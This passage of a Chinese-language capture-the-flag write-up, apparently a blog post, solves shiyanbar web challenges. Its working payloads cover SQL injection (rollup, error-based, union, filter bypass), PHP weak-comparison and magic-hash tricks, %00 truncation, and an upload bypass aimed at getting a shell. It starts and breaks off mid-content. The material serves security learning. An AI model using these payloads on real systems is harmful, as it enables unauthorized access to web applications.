class="line">?&gt;</span><br></pre></td></tr></table></figure><br>阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。<br>我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。  </p><blockquote><p>mysql&gt; create table test (<br>    -&gt; user varchar(100) not null,<br>    -&gt; pwd varchar(100) not null);<br>mysql&gt;insert into test values(“admin”,”mypass”);<br>mysql&gt;select <em> from test group by pwd with rollup<br>mysql&gt; select </em> from test group by pwd with rollup;<br>+——-+————+<br>| user  | pwd        |<br>+——-+————+<br>| guest | alsomypass |<br>| admin | mypass     |<br>| admin | NULL       |<br>+——-+————+<br>3 rows in set<br>mysql&gt; select <em> from test group by pwd with rollup limit 1<br>;<br>+——-+————+<br>| user  | pwd        |<br>+——-+————+<br>| guest | alsomypass |<br>+——-+————+<br>mysql&gt; select </em> from test group by pwd with rollup limit 1 offset 0<br>;<br>+——-+————+<br>| user  | pwd        |<br>+——-+————+<br>| guest | alsomypass |<br>+——-+————+<br>1 row in set<br>mysql&gt; select <em> from test group by pwd with rollup limit 1 offset 1<br>;<br>+——-+——–+<br>| user  | pwd    |<br>+——-+——–+<br>| admin | mypass |<br>+——-+——–+<br>1 row in set<br>mysql&gt; select </em> from test group by pwd with rollup limit 1 offset 2<br>;<br>+——-+——+<br>| user  | pwd  |<br>+——-+——+<br>| admin | NULL |<br>+——-+——+<br>1 row in set   </p></blockquote><p>构造payload:<br><code>uname=1&#39; or true group by pwd with rollup limit 1 offset 2#&amp;pwd=</code><br>offset 2为偏移两个数据，即第三行的pwd字段为空。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5cac9b6950ed3.png">  </p><h3 id="0x09-简单的sql注入之3"><a href="#0x09-简单的sql注入之3" class="headerlink" title="0x09 简单的sql注入之3"></a>0x09 简单的sql注入之3</h3><h4 id="简单概括：-8"><a href="#简单概括：-8" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：mysql报错注入</li><li>难度：易  </li><li>WP：<a href="https://www.cnblogs.com/caizhiren/p/7846917.html" target="_blank" rel="noopener">https://www.cnblogs.com/caizhiren/p/7846917.html</a>  </li></ul><h4 id="解题过程：-8"><a href="#解题过程：-8" class="headerlink" title="解题过程："></a>解题过程：</h4><p>exp函数报错一把嗦<br>/img/loading.gif<img src="" alt="" class="lazyload" data-src="">  </p><h3 id="0x0A-简单的sql注入之2"><a href="#0x0A-简单的sql注入之2" class="headerlink" title="0x0A 简单的sql注入之2"></a>0x0A 简单的sql注入之2</h3><h4 id="简单概括：-9"><a href="#简单概括：-9" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：空格过滤  </li><li>难度：易  </li><li>WP：<a href="https://www.cnblogs.com/caizhiren/p/7862466.html" target="_blank" rel="noopener">https://www.cnblogs.com/caizhiren/p/7862466.html</a>  </li></ul><h4 id="解题过程：-9"><a href="#解题过程：-9" class="headerlink" title="解题过程："></a>解题过程：</h4><p>简单Fuzz发现过滤了空格，使用内敛注释一把嗦。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x3D;database()</span><br></pre></td></tr></table></figure></p><h3 id="0x0B-简单的sql注入之1"><a href="#0x0B-简单的sql注入之1" class="headerlink" title="0x0B 简单的sql注入之1"></a>0x0B 简单的sql注入之1</h3><h4 id="简单概括：-10"><a href="#简单概括：-10" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：双层叠加绕过  </li><li>难度：易</li><li>WP：<a href="https://www.jianshu.com/p/5d37d33854e3" target="_blank" rel="noopener">https://www.jianshu.com/p/5d37d33854e3</a>  </li></ul><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selectselect</span><br></pre></td></tr></table></figure><h3 id="0x0C-天下武功唯快不破"><a href="#0x0C-天下武功唯快不破" class="headerlink" title="0x0C 天下武功唯快不破"></a>0x0C 天下武功唯快不破</h3><h4 id="简单概括：-11"><a href="#简单概括：-11" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：脚本工具的编写  </li><li>难度：易  </li><li>WP：无</li></ul><h4 id="解题过程：-10"><a href="#解题过程：-10" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests,base64</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&#39;)</span><br><span class="line">key&#x3D;base64.b64decode(r.headers[&#39;FLAG&#39;])[-9:]</span><br><span class="line">r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&#39;,data&#x3D;&#123;&#39;key&#39;:key&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="0x0D-让我进去"><a href="#0x0D-让我进去" class="headerlink" title="0x0D 让我进去"></a>0x0D 让我进去</h3><h4 id="简单概括：-12"><a href="#简单概括：-12" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：hash长度拓展攻击  </li><li>难度：难  </li><li>WP：<a href="http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/">http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/</a>  </li></ul><h3 id="0x0E-拐弯抹角"><a href="#0x0E-拐弯抹角" class="headerlink" title="0x0E 拐弯抹角"></a>0x0E 拐弯抹角</h3><h4 id="简单概括：-13"><a href="#简单概括：-13" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：<code>index.php/index.php</code>  </li><li>难度：易  </li><li>WP：无</li></ul><h4 id="解题过程：-11"><a href="#解题过程：-11" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php&#x2F;index.php</span><br></pre></td></tr></table></figure><h3 id="0X0F-Forms"><a href="#0X0F-Forms" class="headerlink" title="0X0F Forms"></a>0X0F Forms</h3><h4 id="简单概括：-14"><a href="#简单概括：-14" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：不清楚，过于简单  </li><li>难度：无  </li><li>WP：无  </li></ul><h3 id="0x10-天网管理系统"><a href="#0x10-天网管理系统" class="headerlink" title="0x10 天网管理系统"></a>0x10 天网管理系统</h3><h4 id="简单概括：-15"><a href="#简单概括：-15" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：PHP<code>==</code>弱类型比较，PHP序列化与反序列化  </li><li>难度：易  </li><li>WP：<a href="http://www.cnblogs.com/ssooking/p/5877086.html" target="_blank" rel="noopener">http://www.cnblogs.com/ssooking/p/5877086.html</a>  </li></ul><h4 id="解题过程：-12"><a href="#解题过程：-12" class="headerlink" title="解题过程："></a>解题过程：</h4><p>右键查看源代码发现部分源码 ：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5caca4c359172.png"><br>我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure></p><h3 id="0x11-忘记密码了"><a href="#0x11-忘记密码了" class="headerlink" title="0x11 忘记密码了"></a>0x11 忘记密码了</h3><h4 id="简单概括：-16"><a href="#简单概括：-16" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：vim源码泄露  </li><li>难度：中  </li><li>WP：<code>.submit.php.swp</code></li></ul><h4 id="解题过程：-13"><a href="#解题过程：-13" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，观察源码，发现管理员邮箱：<a href="mailto:admin@simplexue.com">admin@simplexue.com</a>，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5cacae6dda29d.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">如果登录邮箱地址不是管理员则 die()</span><br><span class="line">数据库结构</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- 表的结构 &#96;user&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;user&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;username&#96; varchar(255) NOT NULL,</span><br><span class="line">  &#96;email&#96; varchar(255) NOT NULL,</span><br><span class="line">  &#96;token&#96; int(255) NOT NULL DEFAULT &#39;0&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8 AUTO_INCREMENT&#x3D;2 ;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- 转存表中的数据 &#96;user&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;email&#96;, &#96;token&#96;) VALUES</span><br><span class="line">(1, &#39;****不可见***&#39;, &#39;***不可见***&#39;, 0);</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line">if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;</span><br><span class="line">if(strlen($token)!&#x3D;10) die(&#39;fail&#39;);</span><br><span class="line">if($token!&#x3D;&#39;0&#39;) die(&#39;fail&#39;);</span><br><span class="line">$sql &#x3D; &quot;SELECT count(*) as num from &#96;user&#96; where token&#x3D;&#39;$token&#39; AND email&#x3D;&#39;$emailAddress&#39;&quot;;</span><br><span class="line">$r &#x3D; mysql_query($sql) or die(&#39;db error&#39;);</span><br><span class="line">$r &#x3D; mysql_fetch_assoc($r);</span><br><span class="line">$r &#x3D; $r[&#39;num&#39;];</span><br><span class="line">if($r&gt;0)&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;失败了呀&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>payload: <a href="mailto:`token=0e11111111&amp;emailAddress=admin@simplexue.com">`token=0e11111111&amp;emailAddress=admin@simplexue.com</a>`<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5cacae6dedacc.png">  </p><h3 id="0x12-Once-More"><a href="#0x12-Once-More" class="headerlink" title="0x12 Once More"></a>0x12 Once More</h3><h4 id="简单概括：-17"><a href="#简单概括：-17" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：ereg函数%00截断，科学计数法  </li><li>难度：易  </li><li>WP：<code>1e9%00*-*</code></li></ul><h4 id="解题过程：-14"><a href="#解题过程：-14" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，得到题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;p&gt;You password must be alphanumeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(&#39;Flag: &#39; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&#39;&lt;p&gt;*-* have not been found&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;p&gt;Invalid password&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含<code>*-*</code>。<br>我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：<br><code>?password=1e8%00*-*</code><br>注意此处的%00只占一个字符的大小。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/11/5caf5ee4d7fef.png">  </p><h3 id="0x13-Guess-Next-Session"><a href="#0x13-Guess-Next-Session" class="headerlink" title="0x13 Guess Next Session"></a>0x13 Guess Next Session</h3><h4 id="简单概括：-18"><a href="#简单概括：-18" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：Session与Cookie绑定，PHP弱类型比较  </li><li>难度：易  </li><li>WP：<code>删掉Cookie，?password=</code>  </li></ul><h4 id="解题过程：-15"><a href="#解题过程：-15" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;])</span><br><span class="line">        die (&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION[‘password’]的值将为NULL，此时如果我们get传入的 password为空，即’’，那么比较结果即为true。<br>payload:<br><code>将cookie删除或禁用，接着访问?password=</code><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/11/5caf5ee4d9f11.png">  </p><h3 id="0x14-FALSE"><a href="#0x14-FALSE" class="headerlink" title="0x14 FALSE"></a>0x14 FALSE</h3><h4 id="简单概括：-19"><a href="#简单概括：-19" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：sha1,md5等传入数组返回Null，PHP弱类型比较  </li><li>难度：易  </li><li>WP：<code>?name[]=1&amp;password[]=2</code>  </li></ul><h4 id="解题过程：-16"><a href="#解题过程：-16" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目获得源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        echo &#39;&lt;p&gt;Your password can not be your name!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">      die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;p&gt;Login first!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过<code>sha1($name)===sha1($password)</code>的强类型判断。<br>故我们的payload构造如下：<br><code>?name[]=a&amp;password[]=b</code><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/11/5caf5ee4db525.png">  </p><h3 id="0x15-上传绕过"><a href="#0x15-上传绕过" class="headerlink" title="0x15 上传绕过"></a>0x15 上传绕过</h3><h4 id="简单概括：-20"><a href="#简单概括：-20" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：目录名%00截断  </li><li>难度：易  </li><li>WP：<code>/upload/1.php%00</code>  </li></ul><h4 id="解题过程：-17"><a href="#解题过程：-17" class="headerlink" title="解题过程："></a>解题过程：</h4><p>burp抓个上传包：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/11/5caf6134b532a.png"><br>首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。<br>如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/11/5caf6134b0844.png">  </p><h3 id="0x16-NSCTF-web200"><a href="#0x16-NSCTF-web200" class="headerlink" title="0x16 NSCTF web200"></a>0x16 NSCTF web200</h3><h4 id="简单概括：-21"><a href="#简单概括：-21" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：逆加密过程  </li><li>难度：易  </li><li>WP：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">部分：</span><br><span class="line">x &#x3D; &quot;~88:36e1bg8438e41757d:29cgeb6e48c&#96;GUDTO|;hbmg&quot;</span><br><span class="line">c &#x3D; &quot;&quot;</span><br><span class="line">for a in x:</span><br><span class="line">    b &#x3D; ord(a)</span><br><span class="line">    c +&#x3D; chr(b-1)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></li></ul><h4 id="解题过程：-18"><a href="#解题过程：-18" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="http://ctf5.shiyanbar.com/web/web200.jpg"><br>解密问题，按照加密过程反着解密即可。  </p><h3 id="0x17-程序逻辑问题"><a href="#0x17-程序逻辑问题" class="headerlink" title="0x17 程序逻辑问题"></a>0x17 程序逻辑问题</h3><h4 id="简单概括：-22"><a href="#简单概括：-22" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：union select联合注入  </li><li>难度：易  </li><li>WP：<code>user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&amp;pass=1</code>  </li></ul><h4 id="解题过程：-19"><a href="#解题过程：-19" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，右键查看源代码得到题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">$conn &#x3D; mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select pw from php where user&#x3D;&#39;$user&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;index.php&gt;</span><br><span class="line">&lt;input type&#x3D;text name&#x3D;user value&#x3D;&quot;Username&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;password name&#x3D;pass value&#x3D;&quot;Password&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;index.txt&quot;&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>strcasecmp()函数不分大小写进行字符串比较。<br>首先我们不知道数据库里已有的用户值为多少，更不知其密码。<br>不过我们可以通过构造联合查询注入来返回我们自定义的数据。<br>payloadd:<br><code>user=abc&#39; union select 